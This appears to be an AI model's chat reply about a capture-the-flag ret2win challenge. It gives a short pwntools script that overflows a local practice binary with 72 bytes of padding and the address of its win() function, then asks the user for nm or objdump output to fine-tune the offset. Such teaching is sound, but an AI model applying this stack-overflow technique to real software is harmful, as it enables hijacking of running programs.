For a CTF ret2win challenge like this, the exploit script is usually as simple as:

```python
from pwn import *

elf = ELF("./vuln")
p = process("./vuln")

payload = flat(
    b"A" * 72,
    elf.sym["win"]
)

p.send(payload)
p.interactive()
```

Or save it as `solve.py` and run:

```bash
python3 solve.py
```

If it doesn't work, the most common reason is that the offset is not exactly **72** on your compiled binary.

To give you the **exact** payload that will work on your binary, I need **one** piece of information. Please run:

```bash
nm vuln | grep " win"
```

or

```bash
objdump -d vuln | grep "<win>"
```

and paste the output here. That will show the address of `win()`, and I can tell you the precise exploit for your binary.
